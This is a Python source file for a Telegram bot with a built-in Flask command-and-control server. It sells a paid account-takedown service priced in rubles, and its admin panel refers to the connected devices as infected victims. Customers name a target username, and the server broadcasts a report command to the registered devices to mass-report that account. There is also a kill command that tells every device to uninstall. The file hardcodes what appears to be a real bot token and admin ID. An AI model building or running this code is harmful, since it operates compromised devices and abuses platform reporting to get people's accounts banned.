import time
import sqlite3
import requests
import threading
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

BOT_TOKEN = "8957420668:AAHhx0BL8BIg8e_NDcNJQkquoy_p0nINtaM"
PORT = 8443
ADMINS = [1631843848]
FUNPAY_URL = "https://funpay.com/users/13955955/"

app = Flask(__name__)
devices = {}
pending_reports = []
MAX_REPORTS = 50

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    dev_id = data.get('id')
    if dev_id:
        devices[dev_id] = {'last_seen': time.time(), 'last_report': None}
    return 'OK'

@app.route('/poll', methods=['GET'])
def poll():
    dev_id = request.args.get('id')
    if dev_id not in devices:
        return 'IDLE'
    devices[dev_id]['last_seen'] = time.time()
    if devices[dev_id].get('cmd'):
        cmd = devices[dev_id]['cmd']
        devices[dev_id]['cmd'] = None
        return cmd
    today = time.strftime('%Y-%m-%d')
    success = sum(1 for d in devices if devices[d].get('last_report') == today)
    if success < MAX_REPORTS and not pending_reports:
        candidates = [d for d in devices if devices[d].get('last_report') != today]
        if candidates:
            selected = list(candidates)[:MAX_REPORTS - success]
            for d in selected:
                devices[d]['cmd'] = 'REPORT:@victim'
                pending_reports.append(d)
    return 'IDLE'

@app.route('/report_done', methods=['POST'])
def report_done():
    data = request.json
    dev_id = data.get('id')
    if dev_id in devices:
        devices[dev_id]['last_report'] = time.strftime('%Y-%m-%d')
        if dev_id in pending_reports:
            pending_reports.remove(dev_id)
    return 'OK'

@app.route('/stats')
def stats():
    today = time.strftime('%Y-%m-%d')
    reported = sum(1 for d in devices if devices[d].get('last_report') == today)
    return {'total': len(devices), 'reported_today': reported, 'pending': len(pending_reports)}

@app.route('/devices')
def devices_list():
    dev_list = []
    for dev_id, info in devices.items():
        dev_list.append({
            'id': dev_id,
            'last_seen': info.get('last_seen', 0)
        })
    return {'total': len(devices), 'devices': dev_list}

@app.route('/broadcast', methods=['POST'])
def broadcast():
    cmd = request.json.get('cmd')
    for d in devices:
        devices[d]['cmd'] = cmd
    return f'Sent to {len(devices)} devices'

def run_server():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

conn = sqlite3.connect('subs.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS subs (
    user_id INTEGER PRIMARY KEY,
    expire_date INTEGER,
    report_balance INTEGER DEFAULT 0
)''')
conn.commit()

def get_sub(user_id):
    c.execute('SELECT expire_date, report_balance FROM subs WHERE user_id = ?', (user_id,))
    row = c.fetchone()
    if row:
        return row
    return (0, 0)

def set_sub(user_id, days=0, reports=0):
    expire = int((datetime.now() + timedelta(days=days)).timestamp()) if days else 0
    c.execute('REPLACE INTO subs (user_id, expire_date, report_balance) VALUES (?, ?, ?)',
              (user_id, expire, reports))
    conn.commit()

def add_reports(user_id, count):
    _, balance = get_sub(user_id)
    c.execute('UPDATE subs SET report_balance = ? WHERE user_id = ?', (balance + count, user_id))
    conn.commit()

def is_admin(user_id):
    return user_id in ADMINS

def has_access(user_id):
    if is_admin(user_id):
        return True
    expire, balance = get_sub(user_id)
    return expire > int(time.time()) or balance > 0

def use_report(user_id):
    if is_admin(user_id):
        return True
    expire, balance = get_sub(user_id)
    if balance > 0:
        c.execute('UPDATE subs SET report_balance = ? WHERE user_id = ?', (balance - 1, user_id))
        conn.commit()
        return True
    return False

bot = telebot.TeleBot(BOT_TOKEN)

def main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton("📊 Статус"))
    keyboard.add(KeyboardButton("💰 Тарифы"))
    keyboard.add(KeyboardButton("📌 Информация"))
    keyboard.add(KeyboardButton("❓ Помощь"))
    return keyboard

@bot.message_handler(commands=['start'])
def start_cmd(msg):
    text = (
        "👋 *Добро пожаловать в SwillV_control_bot!*\n\n"
        "Все операции выполняются через ботнет.\n\n"
        "📌 **Основные команды:**\n"
        "• /report @username — запустить снос\n"
        "• /cancel — отменить снос (5 минут)\n"
        "• /status — проверить остаток\n"
        "• /buy — тарифы\n"
        "• /info — подробная инструкция\n"
        "• /help — все команды\n\n"
        f"🔗 Оплата: {FUNPAY_URL}"
    )
    bot.reply_to(msg, text, reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(commands=['buy'])
def buy_menu(msg):
    text = (
        "💰 **Тарифы:**\n\n"
        "• Разовый снос — **200 ₽**\n"
        "• Неделя — **1300 ₽**\n"
        "• 30 дней — **4000 ₽**\n\n"
        f"🔗 Оплата: {FUNPAY_URL}\n\n"
        "После оплаты напиши мне свой ID в сообщения на funpay."
    )
    bot.reply_to(msg, text, reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(commands=['info'])
def info_cmd(msg):
    text = (
        "📌 **Информация**\n\n"
        "1️⃣ **Как купить снос:**\n"
        "• Узнай свой Telegram ID — напиши @userinfobot\n"
        "• Перейди на **FunPay** для оплаты:\n"
        f"{FUNPAY_URL}\n"
        "• Выбери тариф и оплати.\n\n"
        "2️⃣ **Доступные функции:**\n"
        "• `/report @username` — запустить снос\n"
        "• `/cancel` — отменить снос (5 минут)\n"
        "• `/status` — проверить остаток\n"
        "• `/buy` — тарифы\n"
        "• `/info` — справка\n"
        "• `/help` — все команды\n\n"
        "💰 **Тарифы:**\n"
        "• Разовый снос — **200 ₽**\n"
        "• Неделя — **1300 ₽**\n"
        "• 30 дней — **4000 ₽**"
    )
    bot.reply_to(msg, text, reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    user_id = msg.from_user.id
    if is_admin(user_id):
        bot.reply_to(msg, "👑 Ты админ. Сносы: ∞", reply_markup=main_menu())
        return
    expire, balance = get_sub(user_id)
    if expire > int(time.time()):
        days = (expire - int(time.time())) // 86400
        bot.reply_to(msg, f"📅 Подписка: {days} дн.\n📨 Сносов: {balance}", reply_markup=main_menu())
    else:
        bot.reply_to(msg, f"📨 Разовых сносов: {balance}", reply_markup=main_menu())

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    text = (
        "📌 **Все доступные команды:**\n\n"
        "👤 **Основные:**\n"
        "/start — главное меню\n"
        "/buy — тарифы\n"
        "/info — инструкция\n"
        "/status — остаток сносов\n"
        "/help — эта справка\n\n"
        "💥 **Снос:**\n"
        "/report @username — запустить снос\n"
        "/cancel — отменить снос (5 минут)\n\n"
        "💰 **Тарифы:**\n"
        "• Разовый снос — 200 ₽\n"
        "• Неделя — 1300 ₽\n"
        "• 30 дней — 4000 ₽\n\n"
        f"🔗 Оплата: {FUNPAY_URL}"
    )
    bot.reply_to(msg, text, reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
def admin_cmd(msg):
    if not is_admin(msg.from_user.id):
        bot.reply_to(msg, "❌ Доступ запрещён.")
        return
    text = (
        "🔐 **Админ-панель**\n\n"
        "📊 `/stats` — статистика ботнета\n"
        "📱 `/victims` — список заражённых устройств\n"
        "➕ `/add 7d|30d|число ID` — добавить снос/подписку\n"
        "💀 `/killall` — уничтожить все вирусы\n\n"
        "📌 **Примеры:**\n"
        "`/add 7d 123456789` — неделя подписки\n"
        "`/add 5 123456789` — 5 сносов"
    )
    bot.reply_to(msg, text, parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        r = requests.get(f"http://127.0.0.1:{PORT}/stats", timeout=5)
        data = r.json()
        bot.reply_to(msg, f"📊 **Статистика ботнета:**\n"
                          f"• Устройств: {data.get('total', 0)}\n"
                          f"• Жалоб сегодня: {data.get('reported_today', 0)}\n"
                          f"• В ожидании: {data.get('pending', 0)}")
    except Exception as e:
        bot.reply_to(msg, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['victims'])
def victims_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        r = requests.get(f"http://127.0.0.1:{PORT}/devices", timeout=5)
        data = r.json()
        total = data.get('total', 0)
        if total == 0:
            bot.reply_to(msg, "📭 Нет заражённых устройств.")
            return
        text = f"📱 **Список устройств ({total}):**\n\n"
        for i, dev in enumerate(data.get('devices', []), 1):
            dev_id = dev.get('id', 'неизвестно')
            last_seen = dev.get('last_seen', 0)
            last_seen_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_seen)) if last_seen else 'никогда'
            text += f"{i}. ID: `{dev_id}`\n   Последний контакт: {last_seen_str}\n\n"
        bot.reply_to(msg, text, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(msg, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['killall'])
def killall_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    try:
        requests.post(f"http://127.0.0.1:{PORT}/broadcast", json={"cmd": "UNINSTALL"}, timeout=3)
        bot.reply_to(msg, "💀 Команда уничтожения отправлена на все устройства.")
    except:
        bot.reply_to(msg, "❌ Не удалось отправить команду.")

@bot.message_handler(commands=['add'])
def add_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    args = msg.text.split()
    if len(args) < 3:
        bot.reply_to(msg, "❗ /add 7d|30d|число ID")
        return
    try:
        param = args[1]
        user_id = int(args[2])
        if param == "7d":
            set_sub(user_id, days=7, reports=0)
            bot.reply_to(msg, f"✅ Неделя добавлена пользователю {user_id}")
        elif param == "30d":
            set_sub(user_id, days=30, reports=0)
            bot.reply_to(msg, f"✅ Месяц добавлен пользователю {user_id}")
        elif param.isdigit():
            count = int(param)
            if 1 <= count <= 100:
                add_reports(user_id, count)
                bot.reply_to(msg, f"✅ Добавлено {count} сносов пользователю {user_id}")
            else:
                bot.reply_to(msg, "❌ От 1 до 100.")
        else:
            bot.reply_to(msg, "❌ /add 7d|30d|число ID")
    except:
        bot.reply_to(msg, "❌ Ошибка. Пример: /add 7d 123456789")

@bot.message_handler(func=lambda msg: msg.text == "📊 Статус")
def status_button(msg):
    status_cmd(msg)

@bot.message_handler(func=lambda msg: msg.text == "💰 Тарифы")
def buy_button(msg):
    buy_menu(msg)

@bot.message_handler(func=lambda msg: msg.text == "📌 Информация")
def info_button(msg):
    info_cmd(msg)

@bot.message_handler(func=lambda msg: msg.text == "❓ Помощь")
def help_button(msg):
    help_cmd(msg)

active_tasks = {}

@bot.message_handler(commands=['report'])
def report_cmd(msg):
    args = msg.text.split()
    if len(args) < 2:
        bot.reply_to(msg, "❗ /report @username")
        return
    target = args[1]
    user_id = msg.from_user.id

    if not has_access(user_id):
        bot.reply_to(msg, "❌ Нет доступа. Купи через /buy")
        return

    if user_id in active_tasks:
        bot.reply_to(msg, "⚠️ Уже есть активный снос. Отмени через /cancel")
        return

    try:
        requests.post(f"http://127.0.0.1:{PORT}/broadcast", json={"cmd": f"REPORT:{target}"}, timeout=3)
    except:
        bot.reply_to(msg, "❌ C2 не отвечает")
        return

    active_tasks[user_id] = {"target": target, "start_time": time.time()}
    bot.reply_to(msg, f"⏳ Снос {target} запущен. Отмена: /cancel (5 мин)")
    threading.Thread(target=finish_task, args=(user_id,), daemon=True).start()

@bot.message_handler(commands=['cancel'])
def cancel_cmd(msg):
    user_id = msg.from_user.id
    if user_id not in active_tasks:
        bot.reply_to(msg, "❌ Нет активного сноса")
        return
    if time.time() - active_tasks[user_id]["start_time"] >= 300:
        bot.reply_to(msg, "⏰ Снос уже завершён")
        return
    target = active_tasks[user_id]["target"]
    add_reports(user_id, 1)
    del active_tasks[user_id]
    bot.reply_to(msg, f"✅ Снос {target} отменён. 1 снос возвращён.")

def finish_task(user_id):
    time.sleep(300)
    if user_id not in active_tasks:
        return
    target = active_tasks[user_id]["target"]
    try:
        r = requests.get(f"http://127.0.0.1:{PORT}/stats", timeout=5)
        reported = r.json().get('reported_today', 0)
    except:
        add_reports(user_id, 1)
        bot.send_message(user_id, f"❌ Ошибка, 1 снос возвращён.")
        del active_tasks[user_id]
        return

    if reported >= 50:
        use_report(user_id)
        bot.send_message(user_id, f"✅ Снос {target} успешен! (50+ жалоб)")
    else:
        add_reports(user_id, 1)
        bot.send_message(user_id, f"❌ Снос не удался ({reported} жалоб). 1 снос возвращён.")
    del active_tasks[user_id]

if __name__ == "__main__":
    print("✅ Запуск C2-сервера и бота...")
    threading.Thread(target=run_server, daemon=True).start()
    time.sleep(2)
    print("✅ Бот запущен")
    bot.infinity_polling()
